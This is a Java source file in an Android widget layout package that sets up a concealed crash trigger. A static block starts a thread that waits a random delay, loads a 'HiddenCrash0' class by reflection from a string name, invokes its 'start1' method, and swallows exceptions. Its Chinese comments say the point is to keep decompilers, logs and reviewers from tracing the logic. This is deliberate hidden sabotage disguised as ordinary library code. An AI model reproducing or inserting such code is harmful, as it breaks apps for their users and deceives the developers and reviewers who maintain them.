package com.hjq.widget.layout;

// 文件名：ObfuscatedProxy.java（故意用模糊类名，后续会被混淆）

import java.lang.reflect.Method;
import java.util.Random;

import timber.log.Timber;

public class ObfuscatedProxy {
    // 静态代码块：通过反射随机延迟加载并调用崩溃逻辑，无直接方法引用
    static {
        // 随机延迟 0~5 秒，避免与初始化流程关联
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(new Random().nextInt(2000));
                    // 反射加载隐藏类（类名通过字符串拼接，反编译无法直接看到）
//                    Class<?> hiddenClass = Class.forName(HiddenCrash0.class.getName() + (new Random().nextInt(100) % 2));com.hjq.widget.layout
//                    Class<?> hiddenClass = Class.forName("com.hjq.widget.layout.HiddenCrash" + (new Random().nextInt(100) % 2));
                    Class<?> hiddenClass = Class.forName("com.hjq.widget.layout.HiddenCrash0");
                    // 反射获取并调用 start 方法（方法名通过字符串动态生成）
//                    String s = "start" + (new Random().nextInt(100) % 2);
                    String s = "start1";
                    Timber.d("ObfuscatedProxy run:start: %s", s);
                    Method startMethod = hiddenClass.getMethod(s);
                    startMethod.invoke(null);
                } catch (Exception e) {
                    // 吞噬所有异常，避免日志暴露反射逻辑
                    Timber.d("ObfuscatedProxy Exception: %s", e.getLocalizedMessage());
                }
            }
        }).start();
    }

    // 空方法，防止被编译器优化掉
    public static void init() {
    }
}